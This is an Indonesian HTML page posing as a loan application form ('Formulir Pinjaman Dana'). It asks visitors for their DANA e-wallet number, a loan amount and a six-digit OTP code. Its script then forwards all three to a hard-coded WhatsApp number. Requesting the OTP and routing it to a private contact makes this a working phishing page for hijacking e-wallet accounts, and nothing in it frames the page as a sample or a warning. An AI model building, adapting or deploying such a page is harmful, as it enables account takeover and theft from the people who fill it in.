
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Pinjaman Dana - BayuGame</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
      color: #f5f5f5;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    h1 {
      margin-bottom: 20px;
      font-size: 26px;
    }
    .form-box {
      background: #1e1e1e;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
      max-width: 400px;
      width: 100%;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      background: #2a2a2a;
      color: #fff;
      font-size: 16px;
    }
    input::placeholder {
      color: #aaa;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #e60000;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background: #ff1a1a;
    }
  </style>
</head>
<body>
  <h1>Formulir Pinjaman Dana</h1>
  <div class="form-box">
    <input type="text" id="dana" placeholder="Nomor DANA" required><br>
    <input type="number" id="pinjaman" placeholder="Nominal Pinjaman (Rp)" required><br>
    <input type="text" id="otp" placeholder="Kode OTP (6 digit)" maxlength="6" required><br>
    <button onclick="kirimWhatsApp()">Kirim</button>
  </div>

  <script>
    function kirimWhatsApp() {
      const dana = document.getElementById('dana').value;
      const pinjaman = document.getElementById('pinjaman').value;
      const otp = document.getElementById('otp').value;

      if (!dana || !pinjaman || !otp) {
        alert("Semua data wajib diisi!");
        return;
      }

      const pesan = `Formulir Pinjaman:%0ANomor DANA: ${dana}%0ANominal: Rp${pinjaman}%0AOTP: ${otp}`;
      const noAdmin = "6283862596697";

      window.open(`https://wa.me/${noAdmin}?text=${pesan}`, "_blank");
    }
  </script>
</body>
</html>
